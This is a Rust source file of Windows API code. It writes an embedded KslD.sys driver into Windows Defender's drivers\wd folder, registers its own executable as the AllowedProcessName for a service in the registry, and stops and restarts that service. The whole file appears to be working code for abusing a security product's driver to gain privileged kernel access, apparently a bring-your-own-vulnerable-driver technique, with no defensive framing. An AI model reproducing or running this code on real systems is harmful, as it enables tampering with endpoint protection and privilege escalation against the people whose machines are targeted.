use std::{os::windows::ffi::OsStrExt, path::PathBuf, ptr};

use winapi::{
    shared::{
        minwindef::{DWORD, HKEY},
        winerror::{ERROR_SERVICE_ALREADY_RUNNING, ERROR_SERVICE_NOT_ACTIVE, ERROR_SUCCESS},
    },
    um::{
        errhandlingapi::GetLastError,
        fileapi::{CreateFileW, GetFinalPathNameByHandleW, OPEN_EXISTING},
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
        winnt::{
            FILE_ATTRIBUTE_NORMAL, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, FILE_SHARE_WRITE,
            KEY_SET_VALUE, REG_SZ,
        },
        winreg::{RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE},
        winsvc::{
            CloseServiceHandle, ControlService, OpenSCManagerW, OpenServiceW,
            QueryServiceStatus, StartServiceW, SC_MANAGER_CONNECT, SERVICE_CONTROL_STOP,
            SERVICE_QUERY_STATUS, SERVICE_START, SERVICE_STATUS, SERVICE_STOP, SERVICE_STOPPED,
        },
    },
};

const VOLUME_NAME_NT: DWORD = 0x2;
const DRIVER_BYTES: &[u8] = include_bytes!("../KslD.sys");

const STOP_TIMEOUT_MS: u128 = 5000;
const STOP_POLL_INTERVAL_MS: u64 = 100;

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

pub fn current_exe_device_path() -> Result<String, String> {
    let exe = std::env::current_exe()
        .map_err(|e| format!("current_exe() failed: {e}"))?;

    let wide: Vec<u16> = exe
        .as_os_str()
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let handle = CreateFileW(
            wide.as_ptr(),
            FILE_READ_ATTRIBUTES,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            ptr::null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        );

        if handle == INVALID_HANDLE_VALUE {
            return Err(format!(
                "CreateFileW({}) failed, GetLastError = {}",
                exe.display(),
                GetLastError()
            ));
        }

        let mut buf = vec![0u16; 4096];
        let len = GetFinalPathNameByHandleW(handle, buf.as_mut_ptr(), 4096, VOLUME_NAME_NT);
        let _ = CloseHandle(handle);

        if len == 0 {
            return Err(format!(
                "GetFinalPathNameByHandleW failed, GetLastError = {}",
                GetLastError()
            ));
        }

        Ok(String::from_utf16_lossy(&buf[..len as usize]))
    }
}

pub fn replace_driver() -> Result<(), String> {
    let windir = std::env::var("SystemRoot")
        .unwrap_or_else(|_| "C:\\Windows".to_string());

    let dir: PathBuf = PathBuf::from(&windir)
        .join("System32")
        .join("drivers")
        .join("wd");

    if let Err(e) = std::fs::create_dir_all(&dir) {
        return Err(format!("failed to create {}: {e}", dir.display()));
    }

    let target = dir.join("KslD.sys");

    std::fs::write(&target, DRIVER_BYTES)
        .map_err(|e| format!("failed to write {}: {e}", target.display()))?;

    Ok(())
}

pub fn set_allowed_process(service: &str) -> Result<(), String> {
    let device_path = current_exe_device_path()?;

    let subkey = format!("SYSTEM\\ControlSet001\\Services\\{service}");
    let subkey_w = to_wide(&subkey);
    let value_name_w = to_wide("AllowedProcessName");

    let mut data: Vec<u16> = device_path.encode_utf16().collect();
    data.push(0);
    let data_bytes = unsafe {
        std::slice::from_raw_parts(data.as_ptr() as *const u8, data.len() * 2)
    };

    unsafe {
        let mut hkey: HKEY = ptr::null_mut();
        let result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            subkey_w.as_ptr(),
            0,
            KEY_SET_VALUE,
            &mut hkey,
        );
        if result != ERROR_SUCCESS as i32 {
            return Err(format!("RegOpenKeyExW({subkey}) failed, GetLastError = {result}"));
        }

        let res = RegSetValueExW(
            hkey,
            value_name_w.as_ptr(),
            0,
            REG_SZ,
            data_bytes.as_ptr() as *const u8,
            data_bytes.len() as DWORD,
        );

        let _ = RegCloseKey(hkey);

        if res != ERROR_SUCCESS as i32 {
            return Err(format!(
                "RegSetValueExW(AllowedProcessName) failed, GetLastError = {res}"
            ));
        }
    }

    Ok(())
}

pub fn stop_service(name: &str) -> Result<(), String> {
    let name_w = to_wide(name);
    unsafe {
        let scm = OpenSCManagerW(ptr::null(), ptr::null(), SC_MANAGER_CONNECT);
        if scm.is_null() {
            return Err(format!(
                "OpenSCManagerW failed, GetLastError = {}",
                GetLastError()
            ));
        }

        let svc = OpenServiceW(
            scm,
            name_w.as_ptr(),
            SERVICE_STOP | SERVICE_QUERY_STATUS,
        );
        if svc.is_null() {
            let err = GetLastError();
            let _ = CloseServiceHandle(scm);
            if err == 1060 {
                return Ok(());
            }
            return Err(format!("OpenServiceW({name}) failed, GetLastError = {err}"));
        }

        let mut status: SERVICE_STATUS = std::mem::zeroed();
        let res = ControlService(svc, SERVICE_CONTROL_STOP, &mut status);

        if res == 0 {
            let code = GetLastError();
            let _ = CloseServiceHandle(svc);
            let _ = CloseServiceHandle(scm);

            if code == ERROR_SERVICE_NOT_ACTIVE {
                return Ok(());
            }
            return Err(format!(
                "ControlService(STOP) failed, GetLastError = {code}"
            ));
        }

        let start = std::time::Instant::now();
        loop {
            let mut current: SERVICE_STATUS = std::mem::zeroed();
            if QueryServiceStatus(svc, &mut current) == 0 {
                let code = GetLastError();
                let _ = CloseServiceHandle(svc);
                let _ = CloseServiceHandle(scm);
                return Err(format!(
                    "QueryServiceStatus failed, GetLastError = {code}"
                ));
            }

            if current.dwCurrentState == SERVICE_STOPPED {
                break;
            }

            if start.elapsed().as_millis() > STOP_TIMEOUT_MS {
                let state = current.dwCurrentState;
                let _ = CloseServiceHandle(svc);
                let _ = CloseServiceHandle(scm);
                return Err(format!(
                    "service {name} did not reach SERVICE_STOPPED within {STOP_TIMEOUT_MS} ms (last state = {state})"
                ));
            }

            std::thread::sleep(std::time::Duration::from_millis(STOP_POLL_INTERVAL_MS));
        }

        let _ = CloseServiceHandle(svc);
        let _ = CloseServiceHandle(scm);
    }

    Ok(())
}

pub fn start_service(name: &str) -> Result<(), String> {
    let name_w = to_wide(name);
    unsafe {
        let scm = OpenSCManagerW(ptr::null(), ptr::null(), SC_MANAGER_CONNECT);
        if scm.is_null() {
            return Err(format!(
                "OpenSCManagerW failed, GetLastError = {}",
                GetLastError()
            ));
        }

        let svc = OpenServiceW(scm, name_w.as_ptr(), SERVICE_START);
        if svc.is_null() {
            let err = GetLastError();
            let _ = CloseServiceHandle(scm);
            return Err(format!("OpenServiceW({name}) failed, GetLastError = {err}"));
        }

        let res = StartServiceW(svc, 0, ptr::null_mut());
        let _ = CloseServiceHandle(svc);
        let _ = CloseServiceHandle(scm);

        if res == 0 {
            let code = GetLastError();
            if code != ERROR_SERVICE_ALREADY_RUNNING {
                return Err(format!("StartServiceW failed, GetLastError = {code}"));
            }
        }
    }
    Ok(())
}
